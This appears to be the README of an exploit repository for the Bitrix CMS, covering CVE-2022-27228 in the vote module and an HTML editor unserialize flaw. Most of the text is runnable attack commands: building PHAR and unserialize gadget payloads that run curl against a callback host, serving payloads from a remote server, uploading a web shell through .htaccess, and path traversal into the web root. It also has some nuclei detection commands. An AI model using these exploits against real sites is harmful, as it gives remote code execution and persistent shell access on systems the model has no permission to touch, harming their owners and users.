# bitrix-exploits


## vote

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-27228

```
usage: vote.py [-h] -u url -p payload [-a user_agent] [-x proxy] {unserialize,upload} ...

Bitrix Vote module exploit

positional arguments:
  {unserialize,upload}

optional arguments:
  -h, --help            show this help message and exit
  -u url, --url url     target URL
  -p payload, --payload payload
                        path to payload file
  -a user_agent, --user-agent user_agent
                        User-Agent header
  -x proxy, --proxy proxy
                        Proxy URL
```

### detect

```sh
nuclei -list targets.txt -templates ./nuclei/vote.yaml
```


### unserialize mode

Exploit Nginx or Apache setup using PHAR deserialization:

```sh
php -d phar.readonly=0 gadgets.php rce1 system 'curl XXXXXXXX.bzn.pw' payload.phar
python3 vote.py -u http://target unserialize -p ./payload.phar -x http://localhost:8080
```

⚠️ Payload extension must be ".phar"

### upload mode

Exploit Apache setup using `.htaccess` and shell upload:

```sh
python3 vote.py -u http://target upload -p ./shell.jpg -x http://localhost:8080
```

⚠️ Payload extension must not be ".php"

## html\_editor

```
usage: html_editor.py [-h] -u url [-a user_agent] [-x proxy] {unserialize,upload} ...

Bitrix HTML editor action exploit

positional arguments:
  {unserialize,upload}

optional arguments:
  -h, --help            show this help message and exit
  -u url, --url url     target URL
  -a user_agent, --user-agent user_agent
                        User-Agent header
  -x proxy, --proxy proxy
                        Proxy URL
```

### detect

```sh
nuclei -list targets.txt -templates ./nuclei/html_editor.yaml -var bznpw=http://XXXXXXXX.bzn.pw
```

### unserialize mode

```
usage: html_editor.py unserialize [-h] -p payload

optional arguments:
  -h, --help            show this help message and exit
  -p payload, --payload payload
                        HTTP URL which returns unserialize payload
```

Exploit using unserialize RCE payload located on remote server.

```sh
# Create unserialize payload
php gadgets.php rce1 system 'curl XXXXXXXX.bzn.pw' raw > payload

# Place payload on remote server (for example using sonar)
sonar new test && sonar http new -p test -P /test -f payload

# Exploit will trigger unserialze() on payload from remote server
python3 html_editor.py -u http://target -x http://localhost:8080 unserialize -p http://XXXXXXX.bzn.pw/test
```

### upload mode

⚠️ For old Bitrix versions where "unserialize" mode is not working 

Exploit using upload PHP file and path traversal in unserialze payload located on remote server.

```
usage: html_editor.py upload [-h] -p payload -f file

optional arguments:
  -h, --help            show this help message and exit
  -p payload, --payload payload
                        HTTP URL which returns unserialize payload
  -f file, --file file  Path to php file to upload
```

```sh
# Place traverse payload on remote server (for example using sonar)
sonar new test
sonar http new -p test -P /test $(php -r 'echo serialize(["id" => "../../../../../../../../../../../../var/www/html/"]);')

# Exploit will upload file shell.php to directory "../../../../../../../../../../../../var/www/html/"
python3 html_editor.py -u http://target -x http://localhost:8080 upload -p http://XXXXXXX.bzn.pw/test -f shell.php
```
